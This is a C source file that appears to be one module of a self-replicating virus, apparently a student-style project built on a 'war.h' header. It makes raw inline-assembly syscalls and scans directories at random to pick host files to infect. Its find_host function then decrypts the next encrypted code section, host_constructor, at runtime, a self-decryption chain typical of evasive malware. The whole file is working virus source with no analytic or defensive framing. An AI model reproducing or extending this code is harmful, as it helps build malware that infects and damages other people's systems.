#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// ASM VOLATILE
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline int _open(const char *pathname, int flags, mode_t mode)
{
	int ret;

	asm volatile
	(
		"mov rdi, %0\n"
		"mov esi, %1\n"
		"mov edx, %2\n"

		"mov rax, 0x2\n"
		"syscall\n"
		:
		: "g"(pathname), "g"(flags), "g"(mode)
	);
	asm volatile
	(
		"mov %0, eax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

__attribute__((always_inline)) static inline int _close(int fd)
{
	int ret;

	asm volatile
	(
		"mov edi, %0\n"

		"mov rax, 0x3\n"
		"syscall\n"
		:
		: "g"(fd)
	);
	asm volatile
	(
		"mov %0, eax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

__attribute__((always_inline)) static inline int _getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
	int ret;

	asm volatile
	(
		"mov edi, %0\n"
		"mov rsi, %1\n"
		"mov edx, %2\n"

		"mov rax, 0xd9\n"
		"syscall\n"
		:
		: "g"(fd), "g"(dirp), "g"(count)
	);
	asm volatile
	(
		"mov %0, eax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

__attribute__((always_inline)) static inline size_t _getrandom(void *buf, size_t buflen, unsigned int flags)
{
	ssize_t ret;

	asm volatile
	(
		"mov rdi, %0\n"
		"mov rsi, %1\n"
		"mov edx, %2\n"

		"mov rax, 0x13e\n"
		"syscall\n"
		:
		: "g"(buf), "g"(buflen), "g"(flags)
	);
	asm volatile
	(
		"mov %0, rax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline size_t _strlen(const char *str)
{
	size_t ret = 0;

	if (str == NULL)
		return 0;

	while (str[ret])
		ret++;

	return ret;
}

__attribute__((always_inline)) static inline void _bzero(char *str, const size_t size)
{
	if (str == NULL)
		return ;

	for (register size_t index = 0; index < size; index++)
		str[index] = 0;
}

__attribute__((always_inline)) static inline size_t _get_random_integer(const size_t range)
{
	char buf[4];

	_bzero(buf, 4);

	if (_getrandom(buf, 4, 1) != 4)
		return range / 2;

	int seed = *(int *)buf;
	int ret = seed % range;

	return ret;
}


__attribute__((always_inline)) static inline void update_to_absolute_path(char *path, const char *file)
{
	const size_t p_limit = _strlen(path);
	const size_t f_limit = _strlen(file);

	_bzero(path + p_limit, PATH_MAX - p_limit);

	for (register size_t index = 0; index < f_limit; index++)
		path[p_limit + index] = file[index];
}

__attribute__((always_inline)) static inline enum e_context update_entry(struct s_directory *dir)
{
	int fd = 0;
	size_t limit = 0;

	struct linux_dirent64 *dirp;
	char buf[BUFF_SIZE];
	size_t index;

	if ((fd = _open(dir->path, O_RDONLY | O_DIRECTORY, 0000)) < 0)
		return FAILURE;

	while ((limit = _getdents64(fd, (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
	{
		index = 0;
		while (index < limit)
		{
			dirp = (struct linux_dirent64 *)(buf + index);
			index += dirp->d_reclen;
			dir->entry += 1;
		}
	}

	_close(fd);

	return SUCCESS;
}

__attribute__((always_inline)) static inline enum e_context update_path(struct s_directory *dir)
{
	int fd = 0;
	size_t index = 0;

	struct linux_dirent64 *dirp;
	char buf[BUFF_SIZE];
	size_t limit;
	size_t r_entry;

recursion:

	if ((fd = _open(dir->path, O_RDONLY | O_DIRECTORY, 0000)) < 0)
		return FAILURE;

	r_entry = _get_random_integer(dir->entry);

	while ((limit = _getdents64(fd, (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
	{
		index = 0;
		while (index < limit)
		{
			dirp = (struct linux_dirent64 *)(buf + index);

			if (r_entry == 0)
				break ;

			index += dirp->d_reclen;
			r_entry -= 1;
		}
		if (r_entry == 0)
			break ;
	}

	_close(fd);

	if (dirp->d_name[0] == '.')
		goto recursion;
	else
		update_to_absolute_path(dir->path, dirp->d_name);

	return SUCCESS;
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void find_host(struct s_host *host, struct s_keychain *keychain, void *dir, const size_t size, enum e_context context)
{
	struct s_directory *directory;

	directory = (struct s_directory *)dir;

	for (register unsigned char index = 0; index < size; index++)
	{
		if (update_entry(&(directory[index])) == FAILURE)
		{
			context = FAILURE;
			goto label;
		}
		if (update_path(&(directory[index])) == FAILURE)
		{
			context = FAILURE;
			goto label;
		}
	}


label:
	update_keychain_right(keychain, (char *)find_host, (void *)host_constructor - (void *)find_host);
	decrypt_right(keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);

	host_constructor(host, keychain, directory[_get_random_integer(size)].path, context);
}
